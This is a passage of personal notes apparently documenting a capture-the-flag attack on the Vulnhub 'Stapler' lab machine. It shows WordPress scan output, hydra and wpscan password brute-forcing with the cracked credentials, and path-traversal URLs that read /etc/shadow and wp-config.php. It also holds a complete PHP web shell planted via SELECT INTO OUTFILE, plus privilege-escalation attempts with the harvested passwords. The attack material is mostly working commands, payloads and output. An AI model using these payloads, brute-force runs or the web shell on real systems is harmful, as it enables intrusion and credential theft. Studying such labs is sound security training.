 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[32m[+][0m shortcode-ui
 | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 0.7.4
 | [31m[!][0m Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | Version: 0.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[32m[+][0m two-factor
 | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.4.8
 | Last Updated: 2019-12-26T20:14:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [31m[!][0m Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.


[34m[i][0m Theme(s) Identified:

[32m[+][0m bhost
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/
 | Latest Version: 1.4.4
 | Last Updated: 2019-12-08T00:00:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/readme.txt
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/style.css
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.

[32m[+][0m creative-blog
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/
 | Latest Version: 1.1.2
 | Last Updated: 2019-03-22T00:00:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/readme.txt
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/style.css
 | Style Name: Creative Blog
 | Style URI: http://napitwptech.com/themes/creative-blog/
 | Description: Creative Blog is an extremely creative WordPress theme to create your own personal blog site very ea...
 | Author: Bishal Napit
 | Author URI: http://napitwptech.com/themes/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.

[32m[+][0m sydney
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/
 | Latest Version: 1.57
 | Last Updated: 2019-12-17T00:00:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/readme.txt
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/style.css
 | Style Name: Sydney
 | Style URI: http://athemes.com/theme/sydney
 | Description: Sydney is a powerful business theme that provides a fast way for companies or freelancers to create ...
 | Author: aThemes
 | Author URI: http://athemes.com
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.

[32m[+][0m trope
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/
 | Latest Version: 1.2
 | Last Updated: 2018-06-12T00:00:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/readme.txt
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/style.css
 | Style Name: Trope
 | Style URI: http://wpdean.com/trope-wordpress-theme/
 | Description: Trope is a free WordPress theme that comes with clean, modern, minimal and fully responsive design w...
 | Author: WPDean
 | Author URI: http://wpdean.com/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.

[32m[+][0m twentyfifteen
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/
 | Latest Version: 2.5
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/readme.txt
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | [31m[!][0m 1 vulnerability identified:
 |
 | [31m[!][0m Title: Twenty Fifteen Theme <= 1.1 - DOM Cross-Site Scripting (XSS)
 |     Fixed in: 1.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7965
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3429
 |      - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
 |      - https://packetstormsecurity.com/files/131802/
 |      - https://seclists.org/fulldisclosure/2015/May/41
 |
 | The version could not be determined.

[32m[+][0m twentyfourteen
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfourteen/
 | Latest Version: 2.7
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfourteen/style.css
 | Style Name: Twenty Fourteen
 | Style URI: https://wordpress.org/themes/twentyfourteen/
 | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.

[32m[+][0m twentythirteen
 | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentythirteen/
 | Latest Version: 2.9
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentythirteen/style.css
 | Style Name: Twenty Thirteen
 | Style URI: https://wordpress.org/themes/twentythirteen/
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | The version could not be determined.


[34m[i][0m No Timthumbs Found.


[34m[i][0m No Config Backups Found.


[34m[i][0m No DB Exports Found.


[34m[i][0m No Medias Found.


[34m[i][0m User(s) Identified:

[32m[+][0m peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[32m[+][0m WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 12
 | Requests Remaining: 34

[32m[+][0m Finished: Mon Jan  6 15:30:35 2020
[32m[+][0m Requests Done: 107636
[32m[+][0m Cached Requests: 21
[32m[+][0m Data Sent: 29.104 MB
[32m[+][0m Data Received: 15.057 MB
[32m[+][0m Memory used: 373.49 MB
[32m[+][0m Elapsed time: 00:06:06

```


## Brute Forcing

### Wordpress

```
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# wpscan --url https://192.168.56.101:12380/blogblog/ -U users_wp.txt -P /usr/share/wordlists/rockyou.txt  --disable-tls-checks
[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - john / incorrect                                                                                                                                                               
All Found                                                                                                                                                                                  
Progress Time: 00:23:12 <=

root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# wpscan --url https://192.168.56.101:12380/blogblog/ -U users_wp.txt -P /usr/share/wordlists/rockyou.txt --disable-tls-checks

[+] Performing password attack on Xmlrpc Multicall against 10 user/s
[SUCCESS] - harry / monkey
[SUCCESS] - garry / football
[SUCCESS] - harry / monkey
[SUCCESS] - scott / cookie
[SUCCESS] - kathy / coolgirl

KILLED

```

### ftp

```
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -L users_ftp.txt -e nsr ftp://192.168.56.101 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 20:54:58
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ftp://192.168.56.101:21/
[21][ftp] host: 192.168.56.101   login: elly   password: ylle
[STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 20:55:02


root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -t 64 -L users_ftp.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.56.101 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 18:22:52
[DATA] max 64 tasks per 1 server, overall 64 tasks, 3027 login tries (l:3/p:1009), ~48 tries per task
[DATA] attacking ftp://192.168.56.101:21/
[STATUS] 1458.00 tries/min, 1458 tries in 00:01h, 1698 to do in 00:02h, 64 active
1 of 1 target completed, 0 valid passwords found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 18:24:37
```

### ssh

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -L users_unix.txt -e nsr 192.168.56.101 ssh -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 20:58:38
[DATA] max 4 tasks per 1 server, overall 4 tasks, 90 login tries (l:30/p:3), ~23 tries per task
[DATA] attacking ssh://192.168.56.101:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://peter@192.168.56.101:22
[INFO] Successful, password authentication is supported by ssh://192.168.56.101:22
[22][ssh] host: 192.168.56.101   login: SHayslett   password: SHayslett
[STATUS] 52.00 tries/min, 52 tries in 00:01h, 38 to do in 00:01h, 4 active
[STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 21:00:25

root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -t 64 -L users_unix.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.56.101 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 18:31:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 30270 login tries (l:30/p:1009), ~473 tries per task
[DATA] attacking ssh://192.168.56.101:22/
[STATUS] 370.00 tries/min, 370 tries in 00:01h, 30029 to do in 01:22h, 64 active
[STATUS] 918.33 tries/min, 2755 tries in 00:03h, 27644 to do in 00:31h, 64 active
[STATUS] 1169.43 tries/min, 8186 tries in 00:07h, 22213 to do in 00:19h, 64 active
[STATUS] 1232.17 tries/min, 14786 tries in 00:12h, 15613 to do in 00:13h, 64 active
[STATUS] 1272.29 tries/min, 21629 tries in 00:17h, 8770 to do in 00:07h, 64 active
[STATUS] 1295.50 tries/min, 28501 tries in 00:22h, 1898 to do in 00:02h, 64 active
[STATUS] 1296.87 tries/min, 29828 tries in 00:23h, 571 to do in 00:01h, 64 active
1 of 1 target completed, 0 valid passwords found
[WARNING] Writing restore file because 39 final worker threads did not complete until end.
[ERROR] 39 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 18:55:23
``` 

### Exploit

#### ssh - SHayslett@red

lower priv shell

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# ssh SHayslett@192.168.56.101
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.56.101's password:
Welcome back!
```

#### FTP - elly

grabbed some config files and passwd. see loot/ftp.

#### Advanced Video 1.0 

```
https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../../../../../../../../etc/passwd

https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../../../../../../../../etc/shadow


https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php


https://192.168.56.101:12380/blogblog/wp-content/uploads/

Index of /blogblog/wp-content/uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[IMG]	12316364.jpeg	2020-01-06 19:31 	3.0K	 
[IMG]	419913483.jpeg	2020-01-06 19:25 	2.8K	 
[IMG]	737478762.jpeg	2020-01-06 19:27 	   0 	  
Apache/2.4.18 (Ubuntu) Server at 192.168.56.101 Port 12380
```

##### wp-config

```
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');
```

###### phpmyadmin

Exported all usernames/hashes. See loot/sql folder.

```
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/sql/wordspress# hash-identifier 8cb2237d0679ca88db6464eac60da96345513964
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

SELECT INTO FILE 

```
select '<!-- By justin-p (https://github.com/justin-p) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ --> <?php if (empty($_POST[''cmd''])) {$cmd = "";} elseif (!empty($_POST[''cmd''])) {$cmd = shell_exec($_POST[''cmd'']);} ?> <form method="POST"><input type="text" style="width:100%;height:25px;" name="cmd" id="cmd" value="<?php if (!empty($_POST[''cmd''])) {htmlspecialchars($_POST[''cmd''], ENT_QUOTES, ''UTF-8'');} ?>" required><button type="submit" class="btn btn-primary">Execute</button></form> <?php if (!$cmd && $_SERVER[''REQUEST_METHOD''] != ''POST''): ?><small>Enter command.</small> <?php elseif ($cmd): ?><pre><?= htmlspecialchars($cmd, ENT_QUOTES, ''UTF-8'') ?></pre> <?php elseif (!$cmd && $_SERVER[''REQUEST_METHOD''] == ''POST''): ?><small>No results.</small><?php endif; ?> ' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php' 
```


#### wordpress admin

upload shell as a 'plugin'

### Post Exploit

#### ssh - SHayslett@red

```
SHayslett@red:~$ ls -la
total 28
drwxr-xr-x  3 SHayslett SHayslett 4096 Jan  6 20:58 .
drwxr-xr-x 32 root      root      4096 Jun  4  2016 ..
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 SHayslett SHayslett  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 SHayslett SHayslett 3771 Sep  1  2015 .bashrc
drwx------  2 SHayslett SHayslett 4096 Jan  6 20:58 .cache
-rw-r--r--  1 SHayslett SHayslett  675 Sep  1  2015 .profile
SHayslett@red:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for SHayslett: 
Sorry, user SHayslett may not run sudo on red.
SHayslett@red:~$ su elly
Password: ylle
elly@red:/home/SHayslett$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for elly: ylle
Sorry, user elly may not run sudo on red.
elly@red:/home/SHayslett$ exit
SHayslett@red:~$ su JBare
Password: incorrect
su: Authentication failure
SHayslett@red:~$ su JKanode
Password: incorrect
su: Authentication failure
SHayslett@red:~$ su JLipps
Password: incorrect
su: Authentication failure
SHayslett@red:~$ su root
Password: plbkac
su: Authentication failure
```
